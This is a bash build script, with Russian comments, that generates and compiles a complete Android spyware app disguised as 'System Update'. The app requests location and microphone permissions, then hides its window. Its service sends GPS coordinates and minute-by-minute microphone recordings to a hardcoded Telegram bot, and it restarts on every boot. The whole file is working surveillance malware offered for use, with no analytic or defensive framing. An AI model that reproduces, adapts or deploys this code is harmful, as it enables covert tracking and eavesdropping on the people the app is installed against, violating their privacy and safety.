#!/bin/bash
# language: bash, file: build.sh

PROJECT="SpyApp"
PACKAGE="com.system.update"
PKG_PATH="com/system/update"

echo "[*] Создаю файлы проекта..."
mkdir -p $PROJECT/app/src/main/java/$PKG_PATH
mkdir -p $PROJECT/app/src/main/res/values
mkdir -p $PROJECT/app/src/main/res/xml

# 1. Настройки Gradle
cat <<EOF > $PROJECT/settings.gradle
pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories { google(); mavenCentral() }
}
rootProject.name = "$PROJECT"
include ':app'
EOF

cat <<EOF > $PROJECT/build.gradle
plugins {
    id 'com.android.application' version '8.2.2' apply false
    id 'org.jetbrains.kotlin.android' version '1.9.22' apply false
}
EOF

cat <<EOF > $PROJECT/app/build.gradle
plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'
}
android {
    namespace '$PACKAGE'
    compileSdk 34
    defaultConfig {
        applicationId "$PACKAGE"
        minSdk 24
        targetSdk 34
    }
    buildTypes { release { minifyEnabled false } }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = '17' }
}
dependencies {
    implementation 'androidx.core:core-ktx:1.12.0'
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
}
EOF

# 2. Манифест
cat <<EOF > $PROJECT/app/src/main/AndroidManifest.xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    
    <application android:allowBackup="true" android:label="System Update">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service android:name=".SpyService" android:exported="false" android:foregroundServiceType="location|microphone" />
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED" /></intent-filter>
        </receiver>
    </application>
</manifest>
EOF

cat <<EOF > $PROJECT/app/src/main/res/values/strings.xml
<resources><string name="app_name">System Update</string></resources>
EOF

# 3. MainActivity.kt
cat <<EOF > $PROJECT/app/src/main/java/$PKG_PATH/MainActivity.kt
package $PACKAGE
import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    private val PERMS = arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.RECORD_AUDIO)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!hasPerms()) ActivityCompat.requestPermissions(this, PERMS, 101) else startSpy()
    }
    private fun hasPerms() = PERMS.all { ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED }
    override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) { super.onRequestPermissionsResult(r,p,g); startSpy() }
    private fun startSpy() {
        val i = Intent(this, SpyService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i) else startService(i)
        finishAndRemoveTask()
    }
}
EOF

# 4. SpyService.kt (Сбор данных)
cat <<EOF > $PROJECT/app/src/main/java/$PKG_PATH/SpyService.kt
package $PACKAGE
import android.app.*
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import java.io.File
import java.util.*
import java.util.concurrent.TimeUnit

class SpyService : Service() {
    private val TOKEN = "8891002629:AAGHdlmOkDZQhDdwwYfpFjGGjbTiG3WzZIs"
    private val CHAT = "8437109925"
    private val client = OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).build()
    private var recorder: MediaRecorder? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(1, buildNotif())
        
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        try {
            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10f, object : android.location.LocationListener {
                override fun onLocationChanged(l: Location) { sendTG("📍 GPS: ${l.latitude}, ${l.longitude}") }
                override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
                override fun onProviderEnabled(p: String) {}
                override fun onProviderDisabled(p: String) {}
            })
        } catch (e: SecurityException) {}

        Timer().scheduleAtFixedRate(object : TimerTask() {
            override fun run() { record() }
        }, 0, 60000)
    }

    private fun buildNotif(): Notification {
        val id = "spy"
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(NotificationChannel(id, "Sys", NotificationManager.IMPORTANCE_LOW))
        }
        return Notification.Builder(this, id).setContentTitle("Обновление").setSmallIcon(android.R.drawable.stat_notify_sync).build()
    }

    private fun record() {
        try {
            val f = File(externalCacheDir, "a.mp4")
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else @Suppress("DEPRECATION") MediaRecorder()
            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(f.absolutePath)
                prepare(); start()
            }
            Thread.sleep(10000)
            recorder?.stop(); recorder?.release(); recorder = null
            sendAudio(f)
        } catch (e: Exception) {}
    }

    private fun sendTG(t: String) {
        val b = FormBody.Builder().add("chat_id", CHAT).add("text", t).build()
        client.newCall(Request.Builder().url("https://api.telegram.org/bot$TOKEN/sendMessage").post(b).build()).enqueue(object : Callback {
            override fun onFailure(c: Call, e: java.io.IOException) {}
            override fun onResponse(c: Call, r: Response) { r.close() }
        })
    }

    private fun sendAudio(f: File) {
        val b = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT)
            .addFormDataPart("audio", f.name, RequestBody.create("audio/mp4".toMediaTypeOrNull(), f))
            .build()
        client.newCall(Request.Builder().url("https://api.telegram.org/bot$TOKEN/sendAudio").post(b).build()).enqueue(object : Callback {
            override fun onFailure(c: Call, e: java.io.IOException) { f.delete() }
            override fun onResponse(c: Call, r: Response) { r.close(); f.delete() }
        })
    }
    override fun onBind(i: Intent?): IBinder? = null
}
EOF

# 5. BootReceiver.kt
cat <<EOF > $PROJECT/app/src/main/java/$PKG_PATH/BootReceiver.kt
package $PACKAGE
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        if (i.action == Intent.ACTION_BOOT_COMPLETED) {
            val s = Intent(c, SpyService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) c.startForegroundService(s) else c.startService(s)
        }
    }
}
EOF

# 6. Сборка
echo "[*] Сборка APK..."
cd $PROJECT
gradle wrapper
chmod +x gradlew
./gradlew assembleDebug
